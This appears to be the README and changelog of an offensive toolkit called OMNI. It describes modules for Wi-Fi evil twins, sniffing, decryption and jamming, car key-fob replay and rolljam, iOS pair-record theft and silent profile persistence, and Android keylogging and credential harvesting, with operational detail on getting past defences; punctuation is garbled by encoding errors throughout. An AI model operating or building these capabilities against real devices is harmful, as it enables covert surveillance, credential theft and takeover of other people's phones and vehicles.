## What changed in 1.3 ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â dashboards that feel like buttons

* **New Tkinter dashboard** (`omni gui`, Desktop "OMNI Dashboard", bare exe):
  12 action buttons, module browser with option fields, live streamed output,
  background worker, loot/report buttons.
* **Dashboard rebuilt**: Home tab of actions, all 13 trades, readiness counts,
  scrolling tab strip, command preview, missing-tool line, output scrolling,
  global action keys, and a plain-text fallback for headless hosts.
* **Installer defaults to a small recommended tool set** (`core.setup`
  `PRESET=recommended`) instead of trying every package on the host.
* GUI falls back to the text dashboard and always exits 0; the double-click
  window never leaves a traceback on screen.

## What changed in 1.2 ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â one-click, more reach

* **One-click audit** (`core.auto`, `omni auto`, menu `[a]`, Desktop
  shortcut): 14 safe checks, JSON + Markdown report, an opened loot folder,
  and a 0 exit even when steps are skipped.
* **LAN host scan without root or nmap** (`pentest.hostscan`): neighbour
  table, bounded ping sweep, threaded connect scan; IPv4/CIDR parsing tested.
* **Saved Wi-Fi passwords** (`wifi.passwords`): `netsh` on Windows, `nmcli`
  on Linux, Keychain on macOS; enterprise profiles labelled correctly.
* **Automatic admin elevation** on Windows (`--elevate`, double-click menu)
  with a clean fallback when UAC is declined.
* **One-key install path** in the menu (`i`), plus an `OMNI One-Click`
  shortcut in the installer.
* Every auto step runs in its own try/except, so one failure never stops the
  audit or the menu.

## What changed in 1.1 ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â runs everywhere, no setup wall

* **Missing tools no longer stop anything.** `validate()` warns, the CLI
  prints the install command and returns 0, and the menu keeps its session.
  Modules that truly cannot run with a stand-in say so once (`omni setup`).
* **Native Windows Wi-Fi:** `wifi.adapters`, `wifi.scan`, `wifi.link` and
  `wifi.connect` use `netsh` when aircrack-ng/iw are absent; `wifi.monitor`
  explains that Windows has no monitor vif and points at WSL instead of
  raising.
* **Tool-free pentest:** `pentest.scan` uses a threaded connect scan without
  nmap; `pentest.recon` degrades to resolver data; `pentest.reach` returns an
  empty report instead of an error.
* **No more required-option dead ends:** common defaults (`brute.space`,
  `brute.mutate`, `pentest.scan`, `pentest.recon`, `flip.index`) and a
  printed `usage()` when something is genuinely required.
* **Portable/frozen builds:** a module manifest (`omni/core/_manifest.py`)
  lets the one-file exe find every module; `packaging/` builds `OMNI.exe`
  (`bin/OMNI.exe` is the checked-in build) and the double-click menu.
* **New commands:** `omni menu`, `omni devices`, `omni setup`; `python
  scripts/smoke.py` now works from any directory and reports `BUGS=0`.
* **Fixed:** `omni.rf.subfile.load`, `flip.index` on every file, locked
  browser databases, and the Windows `wifi.connect` profile path.

## Tests

```sh
python -m pytest tests/
python3 scripts/smoke.py            # runs every module with tiny budgets
python3 scripts/undefined_names.py  # static: undefined names + syntax
```

Nothing needs a radio, an adapter, a phone or root: captures, pm3/nfc output,
rtl_power CSVs, login pages and adb/pymobiledevice3 argv are all fixtures, and
the KeeLoq tests do a real encrypt/decrypt round-trip against a synthetic
manufacturer key. `scripts/smoke.py` is the one to run on a fresh box ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â it
prints `BUGS=0` when the code is sound and only "expected" failures (missing
tools) remain.

681 tests. The rogue-AP ones go further than argv: `tests/test_wifi_rogue.py`
starts the captive portal on a real socket and POSTs a login through it, and
feeds a synthetic 802.11 capture with a hand-built ClientHello to the SNI
reader, so the twin's two halves are exercised without a radio. The SNI test
deliberately pads the hello with zeros ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â a naive `00 00` match lands in the
filler, and the length arithmetic is what keeps it on the real extension.
`tests/test_wifi_sniff.py` goes one layer further down: it builds an Ethernet
pcap with a request split across two TCP segments and checks the live decoder
emits it once, then replays the WPA2 handshake capture from `test_wifi_extract`
through the sniffer to prove the key is derived live and the CCMP body comes
out as an `http` event. `tests/test_rf_auto.py` drives the CC1101 controller
with a fake radio whose RSSI is a function of trim, gain and LNA, so AFC, AGC,
clipping and hysteresis are checked the way a signal generator would show them.

The takeover tier is tested the same way ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â through its data, not its hardware.
`tests/test_android_ui.py` parses a real `uiautomator` dump (bounds, labels,
content-descriptions) and a `getevent` stream, so node targeting, shift and
backspace handling and the notification-shade parser are all checked as text.
`tests/test_ios_loot.py` builds a synthetic backup ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â `Manifest.db` plus hashed
blobs, a `keychain-2.db` with two items ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â and runs the index, the search and
the extraction against it. `tests/test_windows_session.py` injects a fake
`user32`/`kernel32`, so window enumeration, the title ranking, focus/close and
the clipboard protocol are exercised exactly as they run. `tests/test_wifi_jam.py`
and `tests/test_car_survey.py` check the plans and argv (channel ranges, mdk4
mode flags, hop windows, scoring) and run the real hop loops with injected
setters, so a jamming or survey run is verified without a radio.

## Honest limits

- **A twin is only as good as the key.** `wifi.eviltwin` broadcasts the real
  SSID *and* the real PSK, so a client with that network remembered joins it
  with no prompt ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â that is what makes it a man in the middle rather than a
  decoy. Without the PSK it falls back to open, and then the operator has to
  wait for someone to notice the duplex SSID and type into the portal.
  802.11w (PMF/management-frame protection) makes the deauth half useless even
  with `MON` and `BSSID` set, MAC randomisation hides most of what the portal
  logs, and a client that answers with a cached `HTTP 301` or DNSSEC-checked
  resolver still redirects fine but leaves more in DNS than in HTTP. Keyless
  reads (`wifi.tls`) stop at SNI, certificate names and DNS: TLS 1.3 encrypts
  the certificate, ECH encrypts the name, and encrypted-client-hello plus DoH
  can leave nothing but an IP.

- **Live sniffing stops at the transport.** `wifi.sniff` reassembles TCP and
  decodes HTTP/1.1 (Content-Length and chunked bodies, gzip best-effort), so a
  login form or a `GET` with a query string arrives whole even when its header
  was split across segments. HTTP/2 and QUIC are frame streams it does not
  reassemble, so a modern browser yields its SNI, certificate names and DNS but
  few requests. On a monitor interface the frames are CCMP: `PSK=` plus the
  SSID (read from the beacons) derives the PTK from the live 4-way handshake
  and decrypts in memory, exactly as `wifi.extract` does offline ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â without the
  key there is nothing above the 802.11 header. TLS 1.3 still ends at SNI, and
  ECH ends even that.
- **`rf.auto` needs something to lock onto.** AFC only walks inside
  `SPAN_KHZ`, one `SPAN_KHZ/4` step per pass, and only moves when a candidate
  wins by `HYSTERESIS` dB; a dead band just tracks the noise floor. The
  CC1101's RSSI moves in 0.5 dB counts, so a 2 dB hysteresis is about four
  counts ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â below that the loop chatters between two adjacent settings, and a
  preset whose bandwidth is narrower than the trim range will look "flat" even
  when the carrier is off-centre.

- **`rf.inject` / `car.inject`** re-encode frames, so the capture must be
  protocol-decodable ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â a RAW-only `.sub` has no fields to synthesize and is
  rejected with a message. They also cannot beat a receiver that demands a
  counter far ahead of the capture; that is what `car.inject`'s `START`/`WINDOW`
  is for, and a frozen replay of a hopping code will not unlock anything twice.
- **`rf.rolljam`** is duty-cycled, not a dedicated two-radio board: the CC1101
  is half-duplex, so it alternates ~120 ms jam and ~40 ms listen windows. It
  works, but a purpose-built rolljam device is faster and more reliable.
- **iOS control is authorized by a file, and files leak.** The Trust tap only
  makes lockdownd write a pair record (Linux `/var/lib/lockdown`, Windows
  `C:\ProgramData\Apple\Lockdown`); anyone who can read that plist is already
  trusted. `ios.record` harvests, carries and replays one, so a second-hand
  laptop or a backup machine hands you the phone with no prompt. What it cannot
  do: create authorization from nothing. With no record on the box and no
  supervision keybag, someone still taps Trust once. `ios.checkm8` is the only
  route that needs no trust at all, and that ends at the A11 (checkm8 is fixed
  in silicon from A12). Wi-Fi control also needs sync-over-Wi-Fi on *and* a
  record *and* both ends on the same L2 segment ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â `ios.discover` only finds
  what the device is already advertising. `ios.takeover` proves control by
  reading the lock state, so a locked phone proves reachability, not a screen.
  `ios.hosts` only shows what the device cares to report, `ios.record
  ACTION=steal` needs working ssh to *that* other machine (and file-read rights
  there), and `ios.ssh`/`ACTION=grab` need an actual jailbreak ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â `root/alpine`
  is a palera1n default, so change it if the device was re-rooted.
- **"No password" is not "no tap".** `ios.connect` never needs the device
  passcode or an iTunes password ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â pairing is certificate based ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â but a stock,
  never-trusted iPhone still shows one Trust alert and somebody has to press it
  (or `PROMPTLESS=false` to inspect first). Only two things remove that tap:
  a supervision keybag (`ios.connect KEYBAG=ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¦` pairs silently) and checkm8.
  `ios.connect` waits `WAIT` seconds for the tap and then reports honestly
  rather than pretending. It also *only* reaches the device over the LAN if
  sync-over-Wi-Fi was already on ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â Wi-Fi onboarding (`ios.wifi_onboard`) gets
  the phone onto your AP, it does not grant trust by itself.
- **iOS file/backup/profile power is real but gated.** `ios.afc` reads
  /var/mobile/Media (photos, documents) on any *paired* device with no Developer
  Mode. `ios.backup` produces a full app-data backup (SMS, chat stores, Wi-Fi
  plists) but a locked device shows a Trust prompt you must accept, and an
  encrypted backup needs `PASSWORD` on any later read.
- **`ios.ls`/`ios.pull`/`ios.push` need Developer Mode** (they ride the
  CoreDevice file service). They reach `appData` sandboxes but not the keychain,
  and app data is only readable for apps whose container is not protected ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â
  `ios.app_containers` shows which ones expose entries at all.
- **`ios.proxy` alone does not intercept TLS.** It points the device at your
  listener; you also need `ios.profile_install` with a CA the device trusts,
  otherwise apps fail certificate validation and just look broken.
- **`ios.backup_extract` rewrites the backup in place** (`backup2 unback`), so
  point `DIR` at a *copy* if you want the original archive intact.
- **Remote control (`ios.remote`, `ios.tap/type/gesture`) needs Developer Mode
  on the device.** `ios.status` tells you which gate is closed and `ios.up`
  fixes the two that can be fixed from the host (Developer Mode via `amfi`, and
  mounting the developer image) ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â but flipping Developer Mode needs a device
  reboot to fully take effect, and a *locked* phone still needs its passcode
  entered for `ios.unlock` to get past a secure keyguard.
  The RSD tunnel is **automatic and root-free on iOS 17.4+** (userspace tunnel);
  only an iOS 17.0-17.3 device needs a manual `start-tunnel` plus
  `ios.rsd_host`/`ios.rsd_port`.
- **`ios.profile_install` is the cheap persistence win**: a `.mobileconfig` can
  install a trusted CA or an HTTP proxy silently. It cannot supervise the device
  unless it is already supervised, and removing a profile the MDM owns needs the
  MDM. Generating the `.mobileconfig` itself is out of scope ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â bring your own.
- **iOS coordinates are normalised 0..65535**, not pixels, so a value copied
  from a screenshot viewer will land somewhere else.
- **`wifi.crack_pure` is correct but slow.** PBKDF2-HMAC-SHA1 with 4096
  rounds is the bottleneck: ~110 tries/s per core on a laptop, ~145/s with
  workers here. It is for small targeted wordlists and short masks, not for
  rockyou (use `wifi.crack`/`wifi.hashcat` for that). It also needs the
  *pair* of handshake messages, and a `pcapng` capture must be converted to
  `pcap` first.
- **`wifi.decrypt` recovers CCMP payloads, not sessions.** It needs the PSK and
  the EAPOL handshake that established the PTK, so it decrypts that
  association only; TKIP frames are skipped, and QoS/A-MSDU aggregates need the
  inner frame handled downstream. The 4-byte FCS is not stripped either.
- **`wifi.extract` is a batch front end, not a TLS breaker.** It decrypts
  whatever handshakes it holds a key for and reassembles TCP, so HTTPS stays
  opaque apart from SNI and DNS ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â only plaintext HTTP yields URLs, forms and
  files. Reassembly stops at the first missing segment, so a lossy capture
  shortens a stream rather than corrupting it. A-MSDU aggregates and TKIP are
  still skipped (CCMP only), and every capture needs both a handshake *and* a
  matching key ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â `AUTO` will happily pair keys you solved earlier, so check the
  skips list if a capture yields nothing.
- **Car profiles in `omni.car`** are best-effort OEM tuning notes, not audited
  per-model truth ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â treat a preset as a starting point, not a guarantee.
- **`car.unlock` only works when the OEM key is in the keystore.** A KeeLoq
  counter cannot be predicted from the frame alone, so it refuses early rather
  than spraying a frozen code. Counter *mode* is a guess: mode 0 (`+1`) and
  mode 2 (`+0x3333`) are both tried by the sweep, and a car on a custom mode
  will still resist.
- **`rf.brute` is linear, not smart.** It walks the space from `START`, so a
  24-bit Princeton target needs a narrowed range and patience; only the 12-bit
  protocols are practically exhaustive. It also cannot tell you *when* the gate
  opened ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â you have to be watching.
- **`android.persist` is a relaunch loop, not a daemon.** It relies on the
  package's own launcher activity plus an alarm and a Doze exemption; Android
  may still kill it under memory pressure, and it dies on reboot unless the app
  holds `RECEIVE_BOOT_COMPLETED`.
- **`android.ui`/`android.automate` need a dumpable window.** `uiautomator dump`
  returns nothing for a secure (FLAG_SECURE) window, and a WebView reports one
  container node with no inner labels ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â the flow then has to fall back to
  `tap 540,1200` coordinates. `wait` polls the tree once a second, so a screen
  that takes longer than `AWAIT` to settle fails that step, not the run.
- **`android.keylog` is a passive event tap.** It needs shell read access to
  `/dev/input/event*` (common, not universal) and it sees the *input device*
  stream: soft-keyboard taps arrive as `ABS_MT_POSITION_*` touches, not as
  keys, so text typed on an on-screen keyboard decodes only where the OEM
  driver emits `EV_KEY`. Hardware keyboards, PIN pads and volume/channel keys
  always decode.
- **`android.notify` needs `--noredact`.** On Android 11+ the shade redacts
  body text unless the caller may read it, so a locked down build returns
  titles only (or a set of `null`s).
- **`ios.loot`/`ios.keychain` read the archive, not the phone.** An *encrypted*
  backup yields a `Manifest.db` you cannot open without the password, and a
  pruned backup has no `KeychainDomain` at all. Keychain `data` blobs are
  encrypted with class keys: `ios.keychain` reports services, accounts and blob
  sizes, and unwrapping the secret itself needs the keybag (`ios.keybag`) plus
  a decryptor ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â it does not pretend to have one.
- **`ios.automate` has no view tree to poll.** `wait` is a fixed sleep, `tap`
  is a coordinate, so a layout change between capture and replay lands the tap
  somewhere real but wrong. It is HID: it needs Developer Mode and an unlocked
  device, exactly like `ios.remote`.
- **`windows.window`/`windows.clipboard` act on the machine they run on.** They
  are the local session (a foothold, a VM, an RDP desktop), not a remote host,
  and Windows blocks a non-elevated process from focusing or closing an elevated
  window ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â the module reports the refusal instead of pretending.
  `windows.service ACTION=install` needs admin, and `ACTION=hives` needs admin
  for `SAM`/`SECURITY`, so expect a partial hive set on a user-level shell.
- **`wifi.jam` is a flood, not a firewall.** Every mode needs a monitor
  interface and a driver that keeps the channel you set; `mdk4` is the real
  path, and only deauth/disassoc (via `aireplay-ng`) and beacon (via
  `airodump-ng`) degrade without it. 802.11w/PMF clients ignore forged deauth
  and disassoc ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â that is what `MODE=eapol` and the auth flood are for ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â and no
  mode jams 5 GHz *and* 2.4 GHz at once: it hops, so a client on the band you
  are not tuned to gets a gap. Legality is yours; 5 GHz also needs DFS-aware
  channel choices.
- **`car.hunt` needs a press inside the window.** It hops and decodes with the
  same CC1101 stack, so a press longer than `DWELL_MS` is only heard for the
  slice the radio is tuned to that band; the frequency it reports is the plan
  slot, not a measurement. `car.frame` needs the manufacturer key and the right
  `SEED` ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â the counter is not derivable from the frame alone, which is the same
  wall `car.unlock` hits.
- **`android.creds` needs root for Wi-Fi PSKs** on Android 10+. Without root it
  degrades to SMS/call-log content queries and any world-readable stores.
- **`ios.supervise` and `ios.erase` are one-way for most users.** Supervision
  cannot be cleanly undone without the supervision keybag, and erase wipes the
  device ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â take `ios.backup` first.
- **`rf.tune` optimises what the chip can hear, not the antenna itself.** It
  picks the best of the *legal register* settings plus a frequency offset; it
  cannot match a resonant antenna or a real LNA. An offset of many kHz also
  shifts you off other transmissions on the nominal carrier, so re-tune per
  target band rather than trusting one global trim.
- **`rf.hunt` sees energy, not protocols.** A single RSSI sample per step can
  miss a brief fob press entirely, and a busy band (WiFi-adjacent noise around
  868) produces phantom peaks. It is a finder, not a receiver: expect to raise
  `DWELL_MS` and to re-run.
- **`wifi.deauth_rage` still loses to a stubborn driver.** If the adapter
  throttles management frames, no amount of reason-code cycling helps ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â some
  clients also simply ignore reason 7 and need one specific code, which is why
  the list is configurable. `wifi.reconnect` beaconing needs `mdk4` and a
  monitor interface that stays on channel equal to the victim's.

## Attribution

OMNI consolidates and adapts code and ideas from the upstream projects listed
above; each retains its original license and authors. The WiFi, radio, car-key
and brute trades are original to this project but follow the conventions of
aircrack-ng, hcxtools, rtl_433, Proxmark3, hashcat and john. Educational /
authorized-testing use only.





